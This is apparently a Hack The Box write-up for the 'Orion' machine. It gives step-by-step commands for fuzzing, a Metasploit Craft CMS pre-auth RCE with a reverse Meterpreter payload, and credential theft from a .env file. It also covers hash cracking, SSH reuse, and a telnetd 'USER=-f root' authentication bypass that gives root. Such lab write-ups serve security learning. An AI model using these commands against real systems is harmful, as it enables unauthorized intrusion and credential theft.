# HTB - Orion (Easy)
**Difficulty:** Easy
**OS:** Linux

## Tools Used
- ffuf
- Metasploit
- Meterpreter
- MySQL
- John the Ripper
- SSH
- Go
- git

## Steps
1. Added `orion.htb` to `/etc/hosts`
2. Ran `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://orion.htb/FUZZ -fc 404` — found `/admin`
3. Visited `http://orion.htb/admin` — identified Craft CMS **5.6.16** from page source (footer branding + JS config)
4. Extracted CSRF token (`CRAFT_CSRF_TOKEN`) from login page HTML for reference
5. Identified **CVE-2025-32432** — unauthenticated RCE in Craft CMS via the asset transform generation endpoint
6. Launched Metasploit: `msfconsole -q`
7. Selected module: `use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432`
8. Configured exploit:
```
set RHOST orion.htb
set LHOST <tun0 IP>
set LPORT 4444
```
set payload php/meterpreter/reverse_tcp
9. Ran `run` — leaked `session.save_path`, confirmed vulnerable, received **Meterpreter session as `www-data`**
10. Enumerated filesystem: `pwd` → `/var/www/html/craft/web`
11. Located environment file: `search -f .env` → `/var/www/html/craft/.env`
12. Read `.env` — found MySQL credentials:
 ```
 CRAFT_DB_USER=root
 CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
 CRAFT_DB_DATABASE=orion
 ```
13. Used `execute -f /bin/bash -a "..."` to run MySQL queries (since interactive `shell` hung on prompts)
14. Dumped user table:
 ```sql
 SELECT username, email, password FROM orion.users;
 ```
 → `admin` / `adam@orion.htb` / bcrypt hash
15. Cracked hash with John:
 ```
 john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/orion.hash
 ```
 → Password: `darkangel`
16. Password reuse: SSH as `adam` with `darkangel` — successful login
17. Read user flag: `cat ~/user.txt`
18. Ran `sudo -l` — no sudo rights for `adam`
19. Enumerated local services: `ss -tulpn` — found **telnetd listening on 127.0.0.1:23** (inetutils 2.7)
20. Identified **CVE-2026-24061** — GNU Inetutils telnetd authentication bypass via NEW-ENVIRON `USER=-f root` injection
21. Created SSH local port forward from Kali:
 ```
 ssh -L 2323:127.0.0.1:23 adam@orion.htb
 ```
22. Cloned exploit: `git clone https://github.com/Chocapikk/CVE-2026-24061.git`
23. Ran PoC:
 ```
 go run poc.go 127.0.0.1 2323
 ```
24. Injected `USER=-f root` — server trusted the flag, granting **root shell** with no credentials
25. Confirmed: `id` → `uid=0(root) gid=0(root)`
26. Read root flag: `cat /root/root.txt`

## What I Learned
- Admin login pages often leak CMS version info directly in page source/footer
- Metasploit modules for recent CVEs can save significant exploit-dev time (vs. hand-rolling PoCs)
- Meterpreter's interactive `shell` can hang on multi-line/piped commands — redirecting output to a file and `cat`-ing it is far more reliable
- `.env` files are a goldmine for DB credentials in PHP frameworks — always check for them post-shell
- Password reuse between CMS admin accounts and SSH/system accounts is still extremely common
- Services bound to `127.0.0.1` aren't inaccessible — SSH local port forwarding exposes them for exploitation
- Legacy protocols like Telnet (especially custom/outdated `inetutils` builds) can harbor serious, modern auth bypass vulnerabilities (NEW-ENVIRON option abuse)
- Always check `ss -tulpn` for loopback-only services — they're often the overlooked privesc vector
